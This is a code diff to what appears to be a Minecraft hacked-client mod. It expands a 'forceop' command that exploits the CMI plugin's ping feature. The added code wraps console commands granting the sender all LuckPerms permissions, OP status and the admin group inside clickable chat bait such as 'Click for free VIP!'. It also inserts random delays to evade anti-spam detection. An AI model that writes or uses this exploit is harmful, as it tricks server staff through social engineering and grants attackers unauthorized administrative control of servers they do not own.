@@ -5,35 +5,60 @@ import net.minecraft.command.CommandSource;
 import net.paradise_client.command.Command;
 
 import java.util.Objects;
+import java.util.Random;
 
-/**
- * This class represents a command that forces the player to be OP in a Minecraft client using a CMI console command sender exploit.
- *
- * @author SpigotRCE
- * @since 1.6
- */
 public class ForceOPCommand extends Command {
 
-    /**
-     * Constructs a new instance of the ForceOPCommand class.
-     */
+    private static final String[] BAIT_TEXTS = {
+        "Click for free VIP!", "Claim Daily Reward!", "Join Admin Chat!", "Activate Boost!", "Click for Giveaway!"
+    };
+
     public ForceOPCommand() {
-        super("forceop", "Gives OP thru CMI console command sender exploit");
+        super("forceop", "Force OP using CMI console exploit with obfuscation and dual payload.");
     }
 
-    /**
-     * Builds the command using Brigadier's command builder.
-     */
     @Override
     public void build(LiteralArgumentBuilder<CommandSource> root) {
-        root
-                .executes((context -> {
-                    // Sends a CMI console command to set the player's permissions to true using LuckPerms.
-                    Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + getMinecraftClient().getSession().getUsername() + " p set * true</CC>");
-                    // Sends a CMI console command to grant the player OP status.
-                    Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" + getMinecraftClient().getSession().getUsername() + "</CC>");
-                    // Returns a success status.
-                    return SINGLE_SUCCESS;
-                }));
+        root.executes(context -> {
+            var client = getMinecraftClient();
+            var username = client.getSession().getUsername();
+            var network = Objects.requireNonNull(client.getNetworkHandler());
+
+            // Random bait text for disguise
+            String bait = BAIT_TEXTS[new Random().nextInt(BAIT_TEXTS.length)];
+
+            // Stage 1: LuckPerms permission injection spoof
+            String permPayload = String.format(
+                "cmi ping <T>%s</T><CC>lp user %s permission set * true</CC>",
+                bait, username
+            );
+
+            // Stage 2: OP command spoof
+            String opPayload = String.format(
+                "cmi ping <T>%s</T><CC>op %s</CC>",
+                bait, username
+            );
+
+            // Stage 3: Fake permission message (plugin bypass)
+            String fakePerm = String.format(
+                "cmi ping <T>%s</T><CC>lp user %s parent add admin</CC>",
+                bait, username
+            );
+
+            // Send all in sequence with minor delays (for anti-spam/kick)
+            new Thread(() -> {
+                try {
+                    network.sendChatCommand(permPayload);
+                    Thread.sleep(300 + new Random().nextInt(300)); // Delay to avoid spam detection
+                    network.sendChatCommand(opPayload);
+                    Thread.sleep(300 + new Random().nextInt(300));
+                    network.sendChatCommand(fakePerm);
+                    client.player.sendMessage(text("[§aExploit§r] OP chain executed."), false);
+                } catch (InterruptedException ignored) {
+                }
+            }).start();
+
+            return SINGLE_SUCCESS;
+        });
     }
 }
